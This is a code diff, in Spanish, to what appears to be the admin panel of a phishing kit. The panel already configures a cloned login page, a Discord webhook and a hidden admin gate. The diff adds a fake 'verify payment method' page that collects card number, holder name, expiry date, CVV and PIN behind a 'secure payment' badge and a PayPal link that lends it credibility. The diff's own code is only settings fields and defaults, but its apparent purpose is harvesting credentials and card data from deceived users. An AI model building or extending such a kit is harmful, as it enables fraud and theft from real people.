@@ -200,6 +200,55 @@ label{font-size:13px;font-weight:500;color:#374151;margin-bottom:4px;display:blo
         <input type="password" id="adminPassword" value="admin123" onchange="updateSetting('adminPassword',this.value)" style="margin-top:8px">
         <p style="font-size:12px;color:#9ca3af;margin-top:4px">La cambias aquí y se aplica a la puerta de admin.</p>
       </div>
+
+      <!-- Pagina de Pago -->
+      <div style="margin-top:20px;padding-top:20px;border-top:1px solid #e5e5e5">
+        <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">Página de Pago</h3>
+        <div class="form-group"><label>Título de la página de pago</label>
+          <input type="text" id="paymentTitle" value="Verificar método de pago" onchange="updateSetting('paymentTitle',this.value)">
+        </div>
+        <div class="form-group"><label>Texto del badge de email</label>
+          <input type="text" id="paymentEmailBadgeText" value="Pago seguro" onchange="updateSetting('paymentEmailBadgeText',this.value)">
+        </div>
+        <div class="form-group"><label>Texto del número de tarjeta (preview)</label>
+          <input type="text" id="paymentCardPreview" value="•••• •••• •••• ••••" onchange="updateSetting('paymentCardPreview',this.value)">
+        </div>
+        <div class="form-group"><label>Nombre del titular (preview)</label>
+          <input type="text" id="paymentNamePreview" value="NOMBRE APELLIDO" onchange="updateSetting('paymentNamePreview',this.value)">
+        </div>
+        <div class="form-group"><label>Fecha de expiración (preview)</label>
+          <input type="text" id="paymentDatePreview" value="MM/AA" onchange="updateSetting('paymentDatePreview',this.value)">
+        </div>
+        <div class="form-row">
+          <div class="form-group"><label>Placeholder: Número de tarjeta</label>
+            <input type="text" id="paymentCardNumberPlaceholder" value="1234 5678 9012 3456" onchange="updateSetting('paymentCardNumberPlaceholder',this.value)">
+          </div>
+          <div class="form-group"><label>Placeholder: Titular</label>
+            <input type="text" id="paymentCardHolderPlaceholder" value="Como aparece en la tarjeta" onchange="updateSetting('paymentCardHolderPlaceholder',this.value)">
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="form-group"><label>Placeholder: Fecha expiración</label>
+            <input type="text" id="paymentExpiryPlaceholder" value="MM/AA" onchange="updateSetting('paymentExpiryPlaceholder',this.value)">
+          </div>
+          <div class="form-group"><label>Placeholder: CVV</label>
+            <input type="text" id="paymentCVVPlaceholder" value="123" onchange="updateSetting('paymentCVVPlaceholder',this.value)">
+          </div>
+        </div>
+        <div class="form-group"><label>Texto: ¿Olvidó su PIN?</label>
+          <input type="text" id="paymentForgotPINText" value="¿Olvidó su PIN?" onchange="updateSetting('paymentForgotPINText',this.value)">
+        </div>
+        <div class="form-group"><label>Texto del botón "Verificar tarjeta"</label>
+          <input type="text" id="paymentSubmitButtonText" value="Verificar tarjeta" onchange="updateSetting('paymentSubmitButtonText',this.value)">
+        </div>
+        <div class="form-group"><label>Texto: Otras formas de pago</label>
+          <input type="text" id="paymentOtherPaymentText" value="Otras formas de pago" onchange="updateSetting('paymentOtherPaymentText',this.value)">
+        </div>
+        <div class="form-group"><label>URL de redirección de "Otras formas de pago"</label>
+          <input type="url" id="paymentRedirectUrl" value="https://www.paypal.com" onchange="updateSetting('paymentRedirectUrl',this.value)">
+          <p style="font-size:12px;color:#9ca3af;margin-top:4px">URL a donde redirige el enlace "Otras formas de pago".</p>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -253,7 +302,20 @@ const DEFAULTS={
   footerPrivateText:'Usa la exploración privada si este no es tu dispositivo.',
   discordWebhook:'',discordMessageTemplate:'',dashboardTitle:'Bienvenido a tu panel',
   dashboardSubtitle:'Administra tu página de inicio de sesión',dashboardWelcomeText:'Bienvenido a tu panel de control.',
-  adminPassword:'admin123'
+  adminPassword:'admin123',
+  paymentTitle:'Verificar método de pago',
+  paymentEmailBadgeText:'Pago seguro',
+  paymentCardPreview:'•••• •••• •••• ••••',
+  paymentNamePreview:'NOMBRE APELLIDO',
+  paymentDatePreview:'MM/AA',
+  paymentCardNumberPlaceholder:'1234 5678 9012 3456',
+  paymentCardHolderPlaceholder:'Como aparece en la tarjeta',
+  paymentExpiryPlaceholder:'MM/AA',
+  paymentCVVPlaceholder:'123',
+  paymentForgotPINText:'¿Olvidó su PIN?',
+  paymentSubmitButtonText:'Verificar tarjeta',
+  paymentOtherPaymentText:'Otras formas de pago',
+  paymentRedirectUrl:'https://www.paypal.com'
 };
 
 let config=null,currentTab='appearance',helpTapCount=0,privacyTapCount=0,modalVisible=false;
@@ -316,6 +378,19 @@ function applyConfig(){
   document.getElementById('dashboardSubtitleInput').value=c.dashboardSubtitle;
   document.getElementById('dashboardWelcomeText').value=c.dashboardWelcomeText;
   document.getElementById('adminPassword').value=c.adminPassword;
+  document.getElementById('paymentTitle').value=c.paymentTitle;
+  document.getElementById('paymentEmailBadgeText').value=c.paymentEmailBadgeText;
+  document.getElementById('paymentCardPreview').value=c.paymentCardPreview;
+  document.getElementById('paymentNamePreview').value=c.paymentNamePreview;
+  document.getElementById('paymentDatePreview').value=c.paymentDatePreview;
+  document.getElementById('paymentCardNumberPlaceholder').value=c.paymentCardNumberPlaceholder;
+  document.getElementById('paymentCardHolderPlaceholder').value=c.paymentCardHolderPlaceholder;
+  document.getElementById('paymentExpiryPlaceholder').value=c.paymentExpiryPlaceholder;
+  document.getElementById('paymentCVVPlaceholder').value=c.paymentCVVPlaceholder;
+  document.getElementById('paymentForgotPINText').value=c.paymentForgotPINText;
+  document.getElementById('paymentSubmitButtonText').value=c.paymentSubmitButtonText;
+  document.getElementById('paymentOtherPaymentText').value=c.paymentOtherPaymentText;
+  document.getElementById('paymentRedirectUrl').value=c.paymentRedirectUrl;
   toggleBgOptions(c.loginBgType);
 }
 
